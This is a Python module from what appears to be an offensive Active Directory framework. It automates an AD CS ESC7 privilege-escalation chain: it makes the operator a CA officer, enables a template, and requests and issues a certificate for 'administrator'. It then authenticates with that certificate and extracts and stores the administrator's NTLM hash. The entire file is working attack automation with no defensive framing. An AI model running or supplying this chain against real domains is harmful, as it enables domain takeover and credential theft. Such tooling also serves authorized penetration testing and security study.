import argparse
from core.runner import run_module_by_name
from core.target import load_current_profile, target_add_cred


def run(args):
    G, R, C, Y, B, W = '\033[92m','\033[91m','\033[96m','\033[93m','\033[94m','\033[0m'
    BOLD = '\033[1m'

    # -------------------------
    # LOAD PROFILE
    # -------------------------
    data, _ = load_current_profile()

    domain = data.get("domain")
    dc = data.get("ip")
    ca = data.get("adcs", {}).get("ca")

    if not domain or not dc or not ca:
        print(f"{R}[-] Missing domain/DC/CA info{W}")
        return

    # -------------------------
    # TEMPLATE SELECTION
    # -------------------------
    # Priority:
    # 1. CLI arg
    # 2. profile templates
    # 3. fallback → SubCA

    if getattr(args, "extra", None):
        template = args.extra[0]
    else:
        templates = data.get("adcs", {}).get("templates", [])
        template = templates[0]["name"] if templates else "template"

    target_user = "administrator"

    # current operator (raven etc)
    current_user = data["creds"][data["current_cred"]]["user"]

    print(f"\n{B}┌────────────────────────────────────────────┐{W}")
    print(f"{B}│{W} {BOLD}{C}CHAIN:{W} ADCS ESC7 ESCALATION          {B}│{W}")
    print(f"{B}└────────────────────────────────────────────┘{W}")

    print(f"    {B}╰─{W} Template: {Y}{template}{W}")
    print(f"    {B}╰─{W} CA: {C}{ca}{W}")

    # =========================================================
    # STEP 1: ADD OFFICER
    # =========================================================
    print(f"\n{B}[*]{W} STEP 1: ADD OFFICER")

    run_module_by_name(
        "ad.ca.addofficer",
        [current_user],
        data
    )

    # =========================================================
    # STEP 2: ENABLE TEMPLATE
    # =========================================================
    print(f"\n{B}[*]{W} STEP 2: ENABLE TEMPLATE")

    run_module_by_name(
        "ad.ca.enabletemplate",
        [template],
        data
    )

    # =========================================================
    # STEP 3: CERT REQUEST
    # =========================================================
    print(f"\n{B}[*]{W} STEP 3: CERT REQUEST")

    result = run_module_by_name(
        "ad.ca.certreq",
        [template, "--user", target_user],
        data
    )

    if not result or not result.get("request_id"):
        print(f"{R}[-] Failed to obtain Request ID{W}")
        return

    req_id = result["request_id"]
    print(f"    {B}╰─{W} Request ID: {G}{req_id}{W}")

    # =========================================================
    # STEP 4: ISSUE CERT
    # =========================================================
    print(f"\n{B}[*]{W} STEP 4: ISSUE CERT")

    run_module_by_name(
        "ad.ca.issue",
        [req_id],
        data
    )

    # =========================================================
    # STEP 5: RETRIEVE CERT
    # =========================================================
    print(f"\n{B}[*]{W} STEP 5: RETRIEVE CERT")

    run_module_by_name(
        "ad.ca.retrieve",
        [req_id],
        data
    )

    # =========================================================
    # STEP 6: AUTH
    # =========================================================
    print(f"\n{B}[*]{W} STEP 6: AUTH")

    result = run_module_by_name(
        "ad.ca.certauth",
        ["administrator.pfx"],
        data
    )

    # =========================================================
    # STEP 7: HASH EXTRACTION
    # =========================================================
    print(f"\n{B}[*]{W} STEP 7: HASH EXTRACTION")

    nt_hash = None

    if isinstance(result, list):
        for c in result:
            if c.get("type") == "ntlm":
                nt_hash = c["secret"]

    if not nt_hash:
        print(f"{R}[-] Failed to extract NTLM hash{W}")
        return

    print(f"    {B}╰─{W} NTLM: {G}{nt_hash}{W}")

    target_add_cred(
        argparse.Namespace(
            user="Administrator",
            password=None,
            hash=nt_hash,
            aes=None,
            ccache=None
        ),
        show=True,
        switch=True
    )

    print(f"\n{G}────────────── CHAIN COMPLETE ──────────────{W}\n")